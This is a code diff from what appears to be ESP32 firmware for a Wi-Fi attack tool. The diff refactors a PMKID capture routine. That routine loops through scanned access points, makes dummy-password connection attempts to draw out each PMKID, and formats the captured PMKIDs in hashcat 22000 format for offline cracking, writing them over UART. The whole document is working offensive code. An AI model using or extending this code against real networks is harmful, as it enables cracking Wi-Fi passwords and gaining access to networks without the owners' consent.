@@ -9,44 +9,40 @@
 #include "uart_controller.h"
 #include "data_converter.h"
 
-TaskHandle_t pmkid_handle = NULL;
-
-bool attack_state = 0;
-
-wifi_ap_record_t ap_info[DEFAULT_SCAN_LIST_SIZE] = {};
-uint16_t ap_count = 0;
-int last_scanned_target = 0;
-
-uint16_t pmkid_scan_time_sec = 2;
+static TaskHandle_t pmkid_handle = NULL;
+static bool attack_state = 0;
+static wifi_ap_record_t ap_info[DEFAULT_SCAN_LIST_SIZE] = {};
+static uint16_t ap_count = 0;
+static int last_scanned_target = 0;
 
 static void pmkid_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
     vTaskSuspend(pmkid_handle);
-    attack_pmkid_stop();
 
+    attack_pmkid_stop();
     key_data_t *key_data = (key_data_t *)event_data;
     uint8_t *pmkid = key_data->pmkid;
     uint8_t mac_client[6] = {};
     wifi_get_sta_mac(mac_client);
-    char *ch22000_pmkid;
-    ch22000_pmkid = pmkid_to_hc22000(
+    uint16_t pmkid_data_len = strlen("PMKID data: ");
+    //pmkid_data_len + MAX_HC22000_01_LEN + '\n' + '\0'
+    char pmkid_buff[pmkid_data_len + MAX_HC22000_01_LEN + 2];
+    memcpy(pmkid_buff, "PMKID data: ", pmkid_data_len);
+    pmkid_data_len += pmkid_to_hc22000(
+        pmkid_buff + pmkid_data_len,
         pmkid, 
         (uint8_t *)(ap_info + last_scanned_target)->bssid, 
         mac_client, 
         (uint8_t *)(ap_info + last_scanned_target)->ssid,
         strlen((char *)(ap_info + last_scanned_target)->ssid)
     );
-
-    uint16_t str_len = strlen(ch22000_pmkid) + strlen("PMKID data: ") + 1;
-    char str[str_len + 1];
-    sprintf(str, "PMKID data: %s\n", ch22000_pmkid);
-    UART_write(str, str_len);
-    free(ch22000_pmkid);
+    memcpy(pmkid_buff + pmkid_data_len, "\n", 2);
+    pmkid_data_len++;
+    UART_write(pmkid_buff, pmkid_data_len);
 
     vTaskResume(pmkid_handle);
 }
 
 void pmkid_active_scan_task(void *arg) {
-
     int scanned_target = 0;
 
     while(1) {
@@ -58,22 +54,20 @@ void pmkid_active_scan_task(void *arg) {
         }
         last_scanned_target = scanned_target;
         if (attack_state) {
-            wifi_sniffer_start((ap_info + scanned_target)->primary);
             frame_analyzer_change_bssid_filter((ap_info + scanned_target)->bssid);
+            wifi_sniffer_start((ap_info + scanned_target)->primary);
         } else {
             attack_pmkid_start(ap_info + scanned_target);
         }
         wifi_sta_connect_to_ap(ap_info + scanned_target, "dummypassword");
 
-        uint16_t str_len = strlen((char *)(ap_info + last_scanned_target)->ssid) + strlen("Current SSID: ") + 1;
-        char str[str_len + 1];
-        sprintf(str, "Current SSID: %s\n", (ap_info + last_scanned_target)->ssid);
-        UART_write(str, str_len);
+        uint16_t ssid_data_len = strlen((char *)(ap_info + last_scanned_target)->ssid) + strlen("Current SSID: ") + 1;
+        char ssid_data[ssid_data_len + 1];
+        sprintf(ssid_data, "Current SSID: %s\n", (ap_info + last_scanned_target)->ssid);
+        UART_write(ssid_data, ssid_data_len);
 
-        vTaskDelay(pmkid_scan_time_sec * 1000 / portTICK_PERIOD_MS);
-
+        vTaskDelay(AP_SCAN_TIME_MS / portTICK_PERIOD_MS);
         wifi_sta_disconnect();
-
         scanned_target++;
     }
 
